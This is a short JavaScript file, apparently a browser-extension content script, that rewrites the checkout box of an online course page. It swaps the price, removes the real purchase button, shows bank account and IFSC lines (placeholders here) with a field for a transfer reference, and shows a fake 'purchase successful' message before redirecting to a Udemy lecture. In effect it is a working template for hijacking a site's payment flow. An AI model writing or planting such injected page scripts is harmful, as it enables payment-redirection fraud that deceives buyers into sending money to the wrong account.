const fun = () => {
  console.log("from ex");

  document.querySelector(
    "#individualcourse > div.main.py-16 > div.sticky.top-0.hidden.self-start.lg\\:block > aside > div.price__body > div > h2"
  ).textContent = "₹27,499.00";

  document
    .querySelector(
      "#individualcourse > div.main.py-16 > div.sticky.top-0.hidden.self-start.lg\\:block > aside > div.price__body > button"
    )
    .remove();

  let inpuTag = document.createElement("input");
  inpuTag.type = "text";
  inpuTag.placeholder = "enter your utr here";
  let mybtn = document.querySelector(
    "#individualcourse > div.main.py-16 > div.sticky.top-0.hidden.self-start.lg\\:block > aside > div.price__body > a"
  );
  if (mybtn) {
    mybtn.parentNode.insertBefore(inpuTag, mybtn);
  }

  let accNumber = document.createElement("p");
  let accIfc = document.createElement("p");

  let myinput = document.querySelector(
    "#individualcourse > div.main.py-16 > div.sticky.top-0.hidden.self-start.lg\\:block > aside > div.price__body > dialog"
  );
  if (myinput) {
    mybtn.parentNode.insertBefore(accIfc, myinput);
    mybtn.parentNode.insertBefore(accNumber, accIfc);
  }

  document.querySelector(
    "#individualcourse > div.main.py-16 > div.sticky.top-0.hidden.self-start.lg\\:block > aside > div.price__body > p:nth-child(2)"
  ).textContent = "acount number:000";
  document.querySelector(
    "#individualcourse > div.main.py-16 > div.sticky.top-0.hidden.self-start.lg\\:block > aside > div.price__body > p:nth-child(3)"
  ).textContent = "ifc code:123";

  let btn = document.querySelector(
    "#individualcourse > div.main.py-16 > div.sticky.top-0.hidden.self-start.lg\\:block > aside > div.price__body > a"
  );

  let newBtn = document.createElement("button");
  newBtn.textContent = "submit";

  btn.parentNode.insertBefore(newBtn, btn);
  btn.remove();
  newBtn.style.backgroundColor = "rgba(50, 117, 304, 0.1)";
  newBtn.style.borderRadius = "10px";

  newBtn.addEventListener("click", () => {
    let pTag = document.createElement("p");
    pTag.textContent = "please wait your request is under process";
    newBtn.parentNode.insertBefore(pTag, newBtn.nextSibling);
    setTimeout(() => {
      pTag.textContent =
        "congratulations you have bought the cours successfully";
    }, 5000);

    setTimeout(() => {
      window.location =
        "https://www.udemy.com/course/the-complete-web-development-bootcamp/learn/lecture/12638830#overview";
    }, 5000);
  });
};

setInterval(() => {
  const chker = document.querySelector(
    "#individualcourse > div.main.py-16 > div.sticky.top-0.hidden.self-start.lg\\:block > aside > div.price__body > a"
  );
  if (chker !== null) {
    fun();
  }
}, 100);
